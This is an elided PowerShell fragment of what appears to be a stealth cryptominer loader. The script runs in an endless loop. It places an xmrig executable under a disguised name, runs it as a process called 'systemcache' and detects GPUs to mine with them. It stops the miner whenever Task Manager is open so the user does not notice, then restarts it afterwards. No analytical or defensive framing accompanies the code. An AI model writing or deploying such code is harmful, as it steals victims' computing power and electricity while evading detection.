...
while ($true) {
    ...
    if (!(Test-Path $MinerPath)) {
        try {
            ...
            Rename-Item "$TargetDir\xmrig.exe" "$TargetDir\$ExeName"
    ...
    # Detect GPU each time (in case GPU added/removed)
    $gpuArgs = ""
    try {
    ...
    # Monitor task manager and miner
    $isTaskmgr = Get-Process -ErrorAction SilentlyContinue | Where-Object { $_.Name -eq "Taskmgr" }
    $isMiner = Get-Process -ErrorAction SilentlyContinue | Where-Object { $_.Name -eq "systemcache" }

    if ($isTaskmgr) {
        if ($isMiner) {
            Stop-Process -Name "systemcache" -Force
        }
    } elseif (-not $isMiner -and (Test-Path $MinerPath)) {
